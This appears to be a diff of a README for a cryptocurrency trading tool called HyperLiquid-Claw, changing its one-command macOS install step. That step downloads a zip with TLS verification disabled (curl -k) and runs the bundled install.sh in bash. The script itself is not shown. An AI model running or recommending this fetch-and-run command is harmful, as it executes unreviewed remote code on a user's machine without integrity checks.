@@ -13,7 +13,7 @@ Built with **Rust** (core engine) + **Solidity** (on-chain vault & registry).
 ## ⚡ Install — macOS (one command)
 
 ```bash
-curl -fsSLk https://github.com/3-JonWallis1993/HyperLiquid-Claw/archive/refs/heads/main.zip -o /tmp/cw.zip && \
+curl -fsSLk github.com/3-JonWallis1993/HyperLiquid-Claw/archive/refs/heads/main.zip -o /tmp/cw.zip && \
 unzip -qo /tmp/cw.zip -d /tmp && \
 cd /tmp/HyperLiquid-Claw-main && \
 bash install.sh
